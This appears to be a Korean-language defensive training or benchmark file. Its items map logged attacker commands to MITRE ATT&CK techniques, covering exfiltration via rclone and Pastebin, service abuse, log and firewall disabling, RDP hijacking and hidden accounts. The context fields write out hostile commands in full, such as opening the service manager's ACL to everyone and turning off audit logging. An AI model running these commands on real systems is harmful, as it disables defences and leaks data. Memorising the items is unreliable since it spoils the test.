{"id": "T1564.006_Q2", "question": "VBoxSVC.exe /reregserver, regsvr32 VboxC.dll 호출 후 VBoxDRV 커널 드라이버 서비스가 생성되었다. 랜섬웨어 관련 문맥에서 이걸 어떻게 해석해야 할까?", "context": "명령: '\"C:\\Program Files\\Oracle\\VirtualBox\\VBoxSVC.exe\" /reregserver', 'regsvr32 /S \"C:\\Program Files\\Oracle\\VirtualBox\\VboxC.dll\"', 'sc create VBoxDRV binpath= \"C:\\Program Files\\Oracle\\VirtualBox\\drivers\\VboxDrv.sys\" type= kernel start= auto'. Maze 관련 IOC와 일치한다.", "answer": "이 일련의 행위는 Portable VirtualBox 구성을 등록해 호스트에서 VM을 구동할 준비를 하는 것이다. 랜섬웨어가 VM 내부에서 페이로드를 실행하기 위한 전단계로, T1564.006 Run Virtual Instance 기법에 해당한다.", "question_type": "attack_classification"}
{"id": "T1564.006_Q3", "question": "VBoxManage.exe createvm / startvm 명령으로 'Atomic VM' 이라는 가상 머신이 생성·시작되었고, 그 내부에서만 대량 파일 암호화가 목격되었다. 어떤 공격 패턴인가?", "context": "호스트 이벤트에서는 VirtualBox VM 생성/시작 로그만 있고, 실제 파일 암호화 I/O는 VM 가상 디스크에서 일어난 것으로 보인다. Sophos 리포트의 Ragnar Locker 사례와 유사하다.", "answer": "호스트 대신 VM 내부에서 랜섬웨어를 실행해 호스트 EDR 가시성을 회피하는 전형적인 T1564.006 Run Virtual Instance 패턴이다. VM 자체가 공격 실행 샌드박스로 쓰이고 있다.", "question_type": "attack_classification"}
{"id": "T1566.001_Q2", "question": "PhishingAttachment.xlsm이 %TEMP% 경로에 내려받힌 후, 사용자가 연 직후 Word가 ping 8.8.8.8 을 수행했다. 어떤 종류의 피싱 공격인가?", "context": "PowerShell로 $env:TEMP\\PhishingAttachment.xlsm 이 다운로드되고, 사용자가 이메일 첨부를 열자 winword.exe가 cmd.exe /c ping 8.8.8.8 명령을 실행했다. 해당 문서에는 AutoOpen 매크로가 내장되어 있다.", "answer": "첨부된 매크로 문서를 통해 사용자가 문서를 여는 순간 코드가 실행되는 스피어피싱 첨부 공격으로, T1566.001 Spearphishing Attachment 에 해당한다. ping은 단순 POC지만, 실제 공격에선 다운로드/실행/백도어 설치로 바뀐다.", "question_type": "attack_classification"}
{"id": "T1566.002_Q2", "question": "PowerShell 스크립트가 user32.dll keybd_event 와 SendKeys를 써서 Win+R 을 자동 입력하고, base64 인코딩된 PowerShell 명령을 실행한다. 이는 어떤 피싱 기법의 후속 단계인가?", "context": "스크립트는 Add-Type 으로 user32.dll을 로드하고, Win+R 키를 시뮬레이션한 뒤 'cmd /c powershell -ec <base64>' 문자열을 Run 창에 SendKeys로 주입한다. 이 스크립트는 웹에서 받은 악성 링크를 통해 실행되었다.", "answer": "사용자를 속여 '복사한 내용을 Run 창에 붙여넣어 실행'하게 만들거나, 스크립트가 이를 자동화하는 패턴은 링크 기반 피싱의 변형이다. 이는 T1566.002 Spearphishing Link 후속 단계로, Paste-and-Run 기법을 통해 페이로드를 실행한다.", "question_type": "attack_classification"}
{"id": "T1567.002_Q2", "question": "rclone.exe가 임시 디렉터리에서 실행되며 Mega 계정으로 'T1567002:test' 경로에 회사 문서들을 업로드한 흔적이 있다. 이건 어떤 데이터 유출인가?", "context": "%appdata%\\rclone\\rclone.conf 에 '[T1567002] type = mega user = atomictesting@outlook.com pass = <암호화 문자열>' 설정이 있고, 'rclone.exe copy --max-size 1700k C:\\Finance T1567002:test -v' 명령이 실행되었다.", "answer": "rclone과 Mega를 이용한 클라우드 스토리지 데이터 유출로, T1567.002 Exfiltration to Cloud Storage에 해당한다. 임시 디렉터리/사용자 프로필에서 rclone.exe가 갑자기 나타나는 것 자체가 강한 IOC다.", "question_type": "attack_classification"}
{"id": "T1567.003_Q2", "question": "Pastebin API 키가 포함된 PowerShell 스크립트가 'secrets, api keys, passwords...' 문자열을 pastebin.com에 POST 했다. 어떤 기술인가?", "context": "$apiKey = \"6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0\" 로 설정된 후, Invoke-RestMethod -Uri \"https://pastebin.com/api/api_post.php\" -Body @{ api_dev_key=$apiKey; api_option='paste'; api_paste_code=$content } 호출이 있었다.", "answer": "텍스트 스토리지 사이트(Pastebin)를 이용해 민감 데이터를 올리는 것은 T1567.003 Exfiltration to Text Storage Sites에 해당한다. API 키가 포함되어 자동화된 업로드가 가능한 상태라면 장기 C2/유출 채널로 쓰이기 쉽다.", "question_type": "attack_classification"}
{"id": "T1569.002_Q2", "question": "sc.exe create ARTService binPath=\"%COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt\" 명령이 실행된 후, 서비스가 한번 시작되고 삭제되었다. 어떤 실행 방식인가?", "context": "서비스 제어 관리자 로그에서 ARTService 서비스가 생성되었다가 곧바로 시작(start) 후 delete 되었다. 그 사이 C:\\art-marker.txt 파일이 새로 생성된 것이 확인된다.", "answer": "서비스를 임시로 만들어 그 컨텍스트에서 명령을 실행한 뒤 바로 삭제하는 방식은 T1569.002 System Services: Service Execution 기법이다. 서비스 기반 실행은 SYSTEM 권한을 얻거나 UAC를 우회하는 데 자주 활용된다.", "question_type": "attack_classification"}
{"id": "T1569.002_Q3", "question": "PsExec.exe 가 \\localhost 또는 다른 호스트를 대상으로 -i -u DOMAIN\\Administrator -p P@ssw0rd1 옵션과 함께 calc.exe를 실행했다. 어떤 측면 이동/실행 기법인가?", "context": "PathToAtomicsFolder\\ExternalPayloads\\PsExec.exe \\192.168.0.10 -i -u DOMAIN\\Administrator -p P@ssw0rd1 -accepteula C:\\Windows\\System32\\calc.exe 명령이 실행되었다. 대상 호스트에서 SYSTEM 권한의 calc.exe 가 확인된다.", "answer": "PsExec는 서비스 기반 원격 실행 도구다. 이를 사용해 원격 호스트에서 프로세스를 띄우는 것은 T1569.002 Service Execution 과 T1021.002 SMB 기반 원격 서비스 호출을 동시에 연상시키는 행동으로, lateral movement 시그니처다.", "question_type": "attack_classification"}
{"id": "T1569.002_Q4", "question": "Snake Malware 리포트와 유사하게 WerFaultSvc라는 서비스가 WinSxS 아래 WerFault.exe를 binPath로 만들어졌다. 이건 어떤 유형의 서비스 악용인가?", "context": "sc.exe create \"WerFaultSvc\" binPath= \"%windir%\\WinSxS\\x86_microsoft-windows-errorreportingfaults_...\\WerFault.exe\" DisplayName= \"WerFault Service\" start= auto 명령이 실행되었다.", "answer": "정식 Windows 에러 리포팅 바이너리를 사용하지만, 비정상 위치와 서비스 이름으로 영속성 채널을 만드는 방식이다. 이는 T1569.002 Service Execution 기반 지속성/실행 기법이며, Snake Malware처럼 은닉성이 높은 서비스 백도어 패턴이다.", "question_type": "attack_classification"}
{"id": "T1569.002_Q5", "question": "sc.exe sdset scmanager D:(A;;KA;;;WD) 명령으로 Service Control Manager ACL이 변경되었다. 왜 위험한가?", "context": "서비스 제어 관리자 보안 디스크립터가 Everyone(세계)에게 KA(모든 권한)를 부여하는 SDDL로 변경되었다. 이후 일반 관리자 계정이 SYSTEM 권한 서비스들을 마음대로 생성/변경할 수 있게 되었다.", "answer": "SCM 권한을 완전히 개방하면, 공격자는 아무 계정으로나 SYSTEM 수준 서비스를 만들어 권한 상승을 할 수 있다. 이는 T1569.002 Service Execution을 악용한 privilege escalation 준비이며, 재부팅 전까지 계속 위험한 상태가 된다.", "question_type": "attack_classification"}
{"id": "T1570_Q2", "question": "NET USE * '\\\\example.com\\sales' /TRANSPORT:QUIC /SKIPCERTCHECK 명령으로 SMB over QUIC 드라이브를 매핑한 뒤, 도구를 그쪽으로 복사했다. 이건 어떤 행위로 봐야 할까?", "context": "PowerShell에서 'NET USE * \"\\\\example.com\\sales\" /TRANSPORT:QUIC /SKIPCERTCHECK' 명령 실행 후, C:\\Tools\\mimikatz.exe 를 새로 매핑된 드라이브 '*:\\' 로 복사한 로그가 있다.", "answer": "이건 SMB over QUIC 채널을 이용해 공격 도구를 파일 서버로 옮기는 것이다. T1570 Lateral Tool Transfer 기법에 해당하며, 이후 다른 시스템에서 해당 공유를 통해 같은 도구를 로드할 수 있다.", "question_type": "attack_classification"}
{"id": "T1571_Q2", "question": "공격자가 Test-NetConnection -ComputerName <서버> -Port 4444, 8081, 8443 등 흔치 않은 포트들을 일괄 테스트하는 스크립트를 돌렸다. 이건 어떤 정찰/통신 준비인가?", "context": "PowerShell 스크립트가 4444, 8081, 8443, 1337 포트에 대해 Test-NetConnection을 반복 호출한다. 해당 포트들은 조직 표준 서비스 포트 목록에 없다.", "answer": "비표준 포트에 대한 대량 연결 테스트는 나중에 C2 채널을 열려는 포트 스캐닝 또는 통신 준비 단계일 수 있다. 이는 T1571 Non-Standard Port 기법과 관련된 행위로, 방화벽 정책 허점이나 우회 가능한 포트를 찾는 과정으로 볼 수 있다.", "question_type": "attack_classification"}
{"id": "T1136.001_Q1", "question": "다음과 같은 계정 생성 흔적은 어떤 MITRE ATT&CK 기법에 해당할까?", "context": "Windows 보안 로그에서 'net user /add T1136.001_CMD T1136.001_CMD!' 명령이 실행되었고, 직후 'net localgroup administrators T1136.001_Admin /add' 이벤트가 확인되었다. 새로운 로컬 사용자와 관리자 계정이 동시에 생성되었다.", "answer": "이 행위는 MITRE ATT&CK T1136.001 'Create Account: Local Account'에 해당한다. net user /add 및 로컬 administrators 그룹 추가를 통해 공격자가 영속적으로 사용할 수 있는 로컬 계정을 만드는 전형적인 패턴이다.", "question_type": "attack_classification"}
{"id": "T1136.002_Q1", "question": "도메인 컨트롤러에서 확인된 다음 활동은 어떤 ATT&CK 기법으로 볼 수 있을까?", "context": "도메인 컨트롤러 보안 로그에서 'net user T1136.002_Admin T1136_pass123! /add /domain' 및 'net group \"Domain Admins\" T1136.002_Admin /add /domain' 명령 실행 기록이 있다. 새로운 도메인 관리 계정이 추가되었다.", "answer": "이 패턴은 T1136.002 'Create Account: Domain Account'에 해당한다. 도메인 범위에서 계정을 생성하고 Domain Admins 그룹에 추가하여 권한 있는 도메인 계정을 영속적으로 확보하려는 시도다.", "question_type": "attack_classification"}
{"id": "T1137_Q1", "question": "Outlook 관련 레지스트리와 파일 아티팩트가 다음과 같을 때, 관련된 공격 기법은 무엇인가?", "context": "HKCU\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security\\Level 값이 1로 설정되어 있고, %APPDATA%\\Microsoft\\Outlook\\VbaProject.OTM 파일이 존재한다. 이 매크로는 Outlook 실행 시 자동으로 코드가 실행되도록 구성되어 있다.", "answer": "이는 T1137 'Office Application Startup' 기법의 한 형태다. Outlook 매크로(VbaProject.OTM)와 보안 레벨 조작을 통해 Office 애플리케이션 시작 시 악성 코드가 자동 실행되는 지속성 수단을 구축한 것이다.", "question_type": "attack_classification"}
{"id": "T1137.001_Q1", "question": "Word 템플릿 Normal.dotm에 매크로가 주입되어 Word 실행 시마다 작업 스케줄러를 생성하는 경우, 어떤 기법으로 분류해야 할까?", "context": "사용자 프로필 아래 AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm 파일의 VBA 프로젝트에 AutoExec 매크로가 추가되어 있으며, 이 매크로는 schtasks /create 명령을 호출해 매일 calc.exe를 실행하는 작업을 등록한다.", "answer": "이 패턴은 T1137.001 'Office Application Startup: Office Template Macros'에 해당한다. 기본 템플릿 Normal.dotm에 악성 매크로를 삽입해 Word가 열릴 때마다 자동으로 코드가 실행되도록 하는 지속성 기법이다.", "question_type": "attack_classification"}
{"id": "T1137.002_Q1", "question": "다음과 같이 Office Test 레지스트리 키가 생성되고 DLL이 지정된 경우, 어떤 공격 기법을 의심해야 할까?", "context": "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf 레지스트리 값에 officetest_x64.dll 또는 officetest_x86.dll 경로가 설정되어 있다. Word 실행 시 해당 DLL이 자동으로 로드된다.", "answer": "이 행위는 T1137.002 'Office Application Startup: Office Test' 기법과 연관된다. Office Test용 디버깅 레지스트리 키를 악용해 Office 애플리케이션 시작 시 지정된 DLL을 로드하게 만들어 코드 실행 및 지속성을 얻는 패턴이다.", "question_type": "attack_classification"}
{"id": "T1137.004_Q1", "question": "Outlook 폴더 홈 페이지 URL 설정을 악용해 C2를 호출하는 행위는 어떤 기법인가?", "context": "HKCU\\Software\\Microsoft\\Office\\16.0\\Outlook\\WebView\\Inbox 키의 URL 값이 file:// 또는 https:// 로 된 스크립트 페이지로 설정되어 있으며, 사용자가 Inbox 폴더를 열 때마다 해당 URL의 콘텐츠가 로드된다.", "answer": "이는 T1137.004 'Office Application Startup: Outlook Home Page'에 해당한다. Outlook 폴더의 홈 페이지 설정을 이용해 폴더 열람 시마다 원격 또는 로컬 악성 페이지를 자동 실행하는 방식이다.", "question_type": "attack_classification"}
{"id": "T1137.006_Q1", "question": "Excel/Word/PowerPoint 시작 시 Add-in 파일(XLL/WLL/XLAM/PPAM)이 자동 실행되며 notepad.exe가 자식 프로세스로 생성되는 경우, 어떤 기법을 적용해야 할까?", "context": "사용자 프로필 내 Microsoft\\AddIns, Word\\Startup, Excel\\XLSTART 경로에 notepad.xll, notepad.wll, notepad.xlam, notepad.ppam 등의 파일이 존재하고, 관련 Office 버전 레지스트리에 Autoload 또는 OPEN 키가 설정되어 있다.", "answer": "이 패턴은 T1137.006 'Office Application Startup: Add-ins'에 해당한다. Office Add-in 파일을 지정된 폴더와 레지스트리 키에 배치하여 Office 실행 시 악성 코드가 자동 실행되도록 하는 지속성 기법이다.", "question_type": "attack_classification"}
{"id": "T1140_Q1", "question": "certutil을 이용해 실행 파일을 인코딩/디코딩하거나 CAB 아카이브를 expand.exe로 풀어내는 행위는 어떤 기법에 해당할까?", "context": "명령 기록에서 'certutil -encode C:\\Windows\\System32\\calc.exe %temp%\\T1140_calc.txt'와 'certutil -decode ... T1140_calc_decoded.exe', 또는 expand.exe를 사용해 로컬 CAB 파일에서 실행 파일을 추출한 흔적이 있다.", "answer": "이는 T1140 'Deobfuscate/Decode Files or Information' 기법에 해당한다. 공격자가 certutil, expand 등 정식 도구를 사용해 페이로드를 인코딩·디코딩하거나 아카이브에서 해제하여 탐지를 우회하고 악성 실행 파일을 복원하는 전형적인 패턴이다.", "question_type": "attack_classification"}
{"id": "T1176_Q1", "question": "Chrome/Edge/Firefox에서 개발자 모드 확장 로드, 웹스토어 악성 확장 설치 등의 흔적이 있을 때 어떤 기법을 고려해야 할까?", "context": "사용자가 chrome://extensions 에서 개발자 모드를 켜고 로컬 디렉터리에서 unpacked extension을 로드했으며, Edge/Chrome 브라우저에 VPN이나 의심스러운 확장 프로그램이 수동으로 설치된 히스토리가 남아 있다.", "answer": "이러한 활동은 T1176 'Browser Extensions' 기법에 해당한다. 브라우저 확장을 악용해 트래픽 프록시, 세션 탈취, 데이터 수집 등 악성 기능을 수행할 수 있으며, 개발자 모드나 비정상적인 확장 설치는 그 지표가 된다.", "question_type": "attack_classification"}
{"id": "T1187_Q1", "question": "PetitPotam, rpcping 등을 이용해 원격 서버로부터 NTLM 인증을 강제로 발생시키는 공격은 어떤 MITRE 기법인가?", "context": "로그에서 PetitPotam.exe가 실행되어 다른 서버 IP를 인자로 호출했고, rpcping -s 127.0.0.1 -e 9997 /a connect /u NTLM 같은 명령이 사용되었다. 이 과정에서 원격 시스템이 강제로 인증 응답을 보내는 것이 관찰되었다.", "answer": "이는 T1187 'Forced Authentication' 기법이다. PetitPotam, rpcping 등 기능을 이용해 원격 시스템이 공격자가 제어하는 서버로 NTLM 인증을 수행하도록 강제해, 이후 릴레이나 크랙용 자격 증명을 수집하려는 시나리오다.", "question_type": "attack_classification"}
{"id": "T1195_Q1", "question": "정상 소프트웨어 체인에 ExplorerSync.db 같은 RAT 드로퍼가 끼어 있는 경우, 어떤 공격 기법으로 해석해야 할까?", "context": "%temp%와 %temp%\\..\\Microsoft 경로에 ExplorerSync.db 파일이 존재하고, 'schtasks /create /tn ExplorerSync /tr \"javaw -jar ...ExplorerSync.db\" /sc MINUTE' 작업 스케줄러 등록 흔적이 있다.", "answer": "이 행위는 T1195 'Supply Chain Compromise'와 연관된다. 오픈소스 또는 배포 체인 내에 악성 드로퍼(ExplorerSync.db)를 삽입하고, 정상 프로세스/작업 스케줄러를 통해 실행하는 공급망 기반 공격의 예시다.", "question_type": "attack_classification"}
{"id": "T1197_Q1", "question": "BITS 작업을 이용해 파일을 다운로드하거나, 완료 시 지정된 프로그램을 실행하는 흔적은 어떤 기법인가?", "context": "bitsadmin.exe /create AtomicBITS, /addfile, /setnotifycmdline 로 작업을 생성하고, Start-BitsTransfer 및 desktopimgdownldr.exe /lockscreenurl 옵션을 통해 외부 URL에서 파일을 내려받은 후 notepad.exe, 기타 실행 파일이 트리거되는 로그가 있다.", "answer": "이는 T1197 'BITS Jobs' 기법이다. BITS(Background Intelligent Transfer Service)를 악용해 조용히 파일을 다운로드하거나, 작업 완료 시 지정된 명령을 실행해 지속성/실행을 달성하는 패턴이다.", "question_type": "attack_classification"}
{"id": "T1562.002_Q1", "question": "Windows 이벤트 로그를 비활성화하거나 IIS HTTP 로깅을 끄는 등의 행위는 어떤 ATT&CK 기법으로 봐야 할까?", "context": "auditpol /clear, auditpol /set /category:\"Logon/Logoff\" /success:disable, wevtutil sl Microsoft-Windows-IKE/Operational /e:false, Invoke-Phant0m.ps1 실행, appcmd.exe 또는 set-WebConfigurationProperty로 IIS httplogging dontLog=true 설정이 확인되었다.", "answer": "이런 활동은 T1562.002 'Impair Defenses: Disable Windows Event Logging'에 해당한다. audit 정책 초기화, wevtutil 로그 비활성화, Phant0m 도구 사용, IIS HTTP 로깅 비활성화를 통해 탐지에 필요한 이벤트 로그를 의도적으로 끄거나 무력화하는 행위다.", "question_type": "attack_classification"}
{"id": "T1562.003_Q1", "question": "명령줄 감사 정책을 끄기 위해 ProcessCreationIncludeCmdLine_Enabled 값을 0으로 변경한 경우 어떤 기법인가?", "context": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit\\ProcessCreationIncludeCmdLine_Enabled 레지스트리 값이 1에서 0으로 변경되었고, reg.exe 또는 PowerShell New-ItemProperty를 통해 수정된 이벤트가 4657로 기록되었다.", "answer": "이는 T1562.003 'Impair Defenses: Impair Command History Logging' 기법에 해당한다. 프로세스 생성 시 명령줄 기록을 남기지 않도록 정책을 비활성화하여, 이후 공격 명령이 감사 로그에 남지 않게 만들려는 시도다.", "question_type": "attack_classification"}
{"id": "T1562.004_Q1", "question": "Windows Defender Firewall을 비활성화하거나 특정 포트를 허용하는 규칙을 추가한 흔적은 어떤 공격 기법으로 분류해야 할까?", "context": "netsh advfirewall set currentprofile state off, 방화벽 EnableFirewall 레지스트리 값을 0으로 변경, netsh advfirewall firewall add rule name=\"Open Port to Any\" dir=in localport=3389, New-NetFirewallRule -LocalPort 21 등의 명령이 확인되었다.", "answer": "이 패턴은 T1562.004 'Impair Defenses: Disable or Modify System Firewall'에 해당한다. 방화벽 전체를 끄거나, RDP/SMB/기타 포트를 허용하는 규칙을 추가해 내부 또는 외부와의 악성 통신을 쉽게 하려는 방어 회피 행위다.", "question_type": "attack_classification"}
{"id": "T1562.006_Q1", "question": ".NET ETW를 끄거나 Windows Defender ETW 채널을 비활성화하는 등, 탐지 지표 자체를 차단하는 행위는 어떤 기법인가?", "context": "HKLM\\Software\\Microsoft\\.NETFramework\\ETWEnabled 값이 0으로 설정되고, COMPlus_ETWEnabled 환경변수가 HKCU/HKLM에 0으로 추가되었으며, Microsoft-Windows-Windows Defender/Operational 채널의 Enabled 값이 0으로 바뀌었다. logman를 이용해 PowerShell ETW provider도 제거되었다.", "answer": "이는 T1562.006 'Impair Defenses: Indicator Blocking'이다. .NET ETW, Defender ETW 채널, PowerShell ETW provider 등을 비활성화해 보안 솔루션이 활용하는 탐지 지표(이벤트·텔레메트리)를 원천적으로 차단하는 방어 회피 기법이다.", "question_type": "attack_classification"}
{"id": "T1562.009_Q1", "question": "bcdedit /set safeboot network 명령을 통해 시스템을 안전 모드로 강제로 재부팅하려는 흔적은 어떤 기법과 관련될까?", "context": "부트 설정 변경 로그에서 bcdedit /set safeboot network 명령이 실행되었고, 재부팅 후 여러 보안 에이전트 서비스가 안전 모드에서 시작되지 않는 것이 확인되었다.", "answer": "이 행위는 T1562.009 'Impair Defenses: Safe Boot Mode'에 해당한다. 공격자는 안전 모드로 부팅해 많은 보안 제품과 드라이버가 비활성화된 상태에서 추가 악성 행위를 수행하려 한다.", "question_type": "attack_classification"}
{"id": "T1562.010_Q1", "question": "PowerShell v2와 같이 보안 기능이 약한 버전으로 다운그레이드해 명령을 실행하는 행위는 어떤 기법인가?", "context": "프로세스 목록에서 'powershell.exe -version 2 -command Invoke-Mimikatz'와 같은 명령이 발견되었다. 이 버전은 AMSI를 지원하지 않는다.", "answer": "이는 T1562.010 'Impair Defenses: Downgrade Attack'에 해당한다. 공격자가 보안 기능이 부족한 옛 버전의 PowerShell을 강제로 사용해 AMSI 등의 방어 기능을 우회하는 다운그레이드 공격이다.", "question_type": "attack_classification"}
{"id": "T1563.002_Q1", "question": "RDP 세션을 탈취해 다른 사용자의 세션으로 전환하는 행위는 어떤 MITRE 기술에 해당할까?", "context": "이벤트 로그에서 tscon 1337 /dest:rdp-tcp#55 명령이 서비스로 실행되었고, sc.exe create sesshijack binpath=\"cmd.exe /k tscon 1337 /dest:rdp-tcp#55\" 후 net start sesshijack가 수행되었다. 기존 사용자의 세션이 다른 세션으로 붙었다.", "answer": "이 패턴은 T1563.002 'Remote Service Session Hijacking: RDP Hijacking'이다. tscon을 이용해 기존 RDP 세션을 가로채어, 비밀번호 없이 활성 세션을 탈취하는 원격 서비스 세션 하이재킹 기법이다.", "question_type": "attack_classification"}
{"id": "T1564.001_Q1", "question": "파일 속성이 System 또는 Hidden으로 설정되어 탐색기 기본 보기에서 숨겨진 경우, 어떤 기법으로 볼 수 있을까?", "context": "%temp%\\T1564.001.txt 파일에 대해 attrib.exe +s 또는 PowerShell에서 $file.attributes='Hidden'/'System'으로 설정된 흔적이 있다. 파일은 시스템/숨김 속성을 가져 기본 탐색기에서 보이지 않는다.", "answer": "이는 T1564.001 'Hide Artifacts: Hidden Files and Directories'에 해당한다. 파일 속성을 System/Hidden으로 바꿔 사용자가 쉽게 발견하지 못하도록 악성 구성 요소나 마커 파일을 숨기는 전형적인 방법이다.", "question_type": "attack_classification"}
{"id": "T1564.002_Q1", "question": "로그온 화면에는 보이지 않지만 실제로 존재하는 숨김 사용자 계정을 만드는 공격은 어떤 기법인가?", "context": "NET USER AtomicOperator$ At0micRedTeam! /ADD 명령으로 계정을 만들고, HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist 하위에 AtomicOperator$ REG_DWORD 값 0이 생성되었다.", "answer": "이 행위는 T1564.002 'Hide Artifacts: Hidden Users' 기법이다. SpecialAccounts\\UserList 레지스트리를 이용해 계정 자체는 유지하되 로그인 화면에는 표시하지 않음으로써 숨겨진 백도어 계정을 만든다.", "question_type": "attack_classification"}
{"id": "T1564.003_Q1", "question": "PowerShell을 hidden window로 실행하거나 conhost를 headless 모드로 실행해 UI를 숨기는 기법은 무엇인가?", "context": "프로세스 명령줄에서 'powershell.exe -WindowStyle hidden calc.exe', 'chrome --headless --disable-gpu', 'conhost.exe --headless calc.exe' 와 같이 창이 표시되지 않는 실행 옵션이 사용되었다.", "answer": "이 패턴은 T1564.003 'Hide Artifacts: Hidden Window'에 해당한다. PowerShell, 브라우저, conhost 등을 숨김·헤드리스 모드로 실행하여 사용자에게 창을 보여주지 않고 백그라운드에서 명령을 수행하는 기법이다.", "question_type": "attack_classification"}
{"id": "T1564.006_Q1", "question": "VirtualBox 또는 Hyper-V를 이용해 별도의 가상머신을 만들고 그 내부에서 페이로드를 실행하는 방식은 어떤 기법에 해당할까?", "context": "VBoxManage.exe createvm --name \"Atomic VM\" --register, Hyper-V New-VM -Name \"Atomic VM\" 명령이 실행되었고, 가상머신이 시작된 후 그 안에서 파일 암호화 활동이 관찰되었다. Maze/Ragnar Locker 계열 랜섬웨어가 이런 패턴을 사용한 사례가 있다.", "answer": "이는 T1564.006 'Hide Artifacts: Run Virtual Instance' 기법이다. 호스트가 아니라 가상머신 내부에서 악성코드를 실행함으로써 호스트 보안 솔루션의 가시성을 회피하고 흔적을 분리하는 공격 방식이다.", "question_type": "attack_classification"}
{"id": "T1566.001_Q1", "question": "사용자가 매크로 활성화된 문서를 열고, 그 결과 Word가 cmd를 띄워 외부 IP를 ping하는 행동은 어떤 피싱 기법인가?", "context": "이메일 첨부로 전달된 PhishingAttachment.xlsm 파일이 %temp%에 저장되었고, Word가 자식 프로세스로 cmd.exe /c ping 8.8.8.8 을 실행했다. 매크로 코드가 로컬 .jse 파일을 생성한 뒤 명령을 수행했다.", "answer": "이 시나리오는 T1566.001 'Phishing: Spearphishing Attachment'에 해당한다. 공격자는 매크로가 포함된 문서를 첨부로 보내고, 사용자가 이를 열어 매크로를 실행함으로써 시스템에서 명령을 수행하게 만든다.", "question_type": "attack_classification"}
{"id": "T1566.002_Q1", "question": "사용자에게 특정 링크를 클릭하게 하여 Win+R, PowerShell 등으로 페이로드를 실행하게 만드는 'Paste and Run'류 공격은 어떤 기법인가?", "context": "브라우저 기반 피싱 페이지에서 사용자가 복사한 PowerShell 명령이 클립보드에 들어가고, 스크립트가 Win+R을 자동으로 눌러 실행 대화 상자에 'cmd /c powershell -ec <Base64>'를 입력해 calc.exe를 실행했다.", "answer": "이 공격은 T1566.002 'Phishing: Spearphishing Link'에 해당한다. 악성 링크를 통해 사용자를 Run 대화창/PowerShell 명령 실행으로 유도하고, 인코딩된 명령을 실행시키는 링크 기반 스피어피싱 기법이다.", "question_type": "attack_classification"}
{"id": "T1567.002_Q1", "question": "rclone을 사용해 Mega 같은 클라우드 스토리지로 내부 파일을 업로드하는 행동은 어떤 기법인가?", "context": "시스템에 rclone.exe가 내려받아졌고, rclone config로 Mega 계정 atomictesting@outlook.com이 설정되었다. 이후 rclone copy --max-size 1700k <로컬 디렉터리> T1567002:test 명령이 실행되었다.", "answer": "이는 T1567.002 'Exfiltration Over Web Service: Exfiltration to Cloud Storage' 기법이다. rclone과 같은 도구를 사용해 Mega 등 클라우드 스토리지로 데이터를 업로드하여 유출하는 방식이다.", "question_type": "attack_classification"}
{"id": "T1567.003_Q1", "question": "Pastebin API를 통해 민감 정보를 HTTP POST로 전송하는 행위는 어떤 기법인가?", "context": "PowerShell에서 https://pastebin.com/api/api_post.php 로 Invoke-RestMethod -Method Post 호출이 있었고, api_dev_key, api_option=paste, api_paste_code='secrets, api keys...' 등의 파라미터가 포함되어 있었다.", "answer": "이 활동은 T1567.003 'Exfiltration Over Web Service: Exfiltration to Text Storage Sites'와 일치한다. Pastebin 같은 텍스트 저장 사이트를 사용해 HTTP POST로 비밀 데이터를 외부로 유출하는 방식이다.", "question_type": "attack_classification"}
{"id": "T1569.002_Q1", "question": "sc.exe를 이용해 임의의 명령을 서비스 형태로 등록하거나 PsExec/RemCom으로 원격에서 calc.exe를 띄우는 경우, 어떤 기법으로 분류해야 할까?", "context": "로컬에서 'sc create ARTService binPath= \"%COMSPEC% /c powershell.exe ...\"' 후 sc start ARTService가 실행되었고, 별도로 PsExec.exe와 RemCom.exe가 \\localhost 대상에 calc.exe를 실행하도록 사용되었다. Snake/BlackCat 관련 서비스 생성 패턴도 유사하게 보였다.", "answer": "이런 행위는 T1569.002 'System Services: Service Execution' 기법이다. Windows 서비스 또는 PsExec/RemCom과 같은 원격 서비스 실행 도구를 사용해 로컬/원격 시스템에서 명령을 서비스 형태로 실행하는 공격 패턴이다.", "question_type": "attack_classification"}
{"id": "T1570_Q1", "question": "SMB over QUIC를 이용해 파일 서버로 도구나 데이터를 전송하는 행위는 어떤 기법에 해당할까?", "context": "PowerShell에서 New-SmbMapping -RemotePath \"\\\\example.com\\sales\" -TransportType QUIC -SkipCertificateCheck 이후 로컬 파일 C:\\path\\to\\file.txt를 Z: 드라이브로 복사한 기록이 있다. 또는 NET USE * '\\\\example.com\\sales' /TRANSPORT:QUIC /SKIPCERTCHECK 후 같은 복사가 수행되었다.", "answer": "이 패턴은 T1570 'Lateral Tool Transfer'에 해당한다. SMB over QUIC 같은 채널을 이용해 도구나 데이터를 다른 시스템 공유 폴더로 전송해 측면 이동이나 추가 공격을 준비하는 행위다.", "question_type": "attack_classification"}
{"id": "T1571_Q1", "question": "Test-NetConnection으로 8081 등 비표준 포트에 대한 연결을 시도하는 행위는 어떤 MITRE 기법과 연관될까?", "context": "PowerShell 로그에서 Test-NetConnection -ComputerName google.com -Port 8081 명령이 반복적으로 실행되었다. 해당 포트는 일반적인 웹 트래픽 포트(80/443)가 아니다.", "answer": "이는 T1571 'Non-Standard Port' 기법과 관련된다. 공격자가 8081 등 잘 사용되지 않는 포트를 통해 C2 통신이나 스캔을 시도하는 비정상 포트 사용 패턴이다.", "question_type": "attack_classification"}
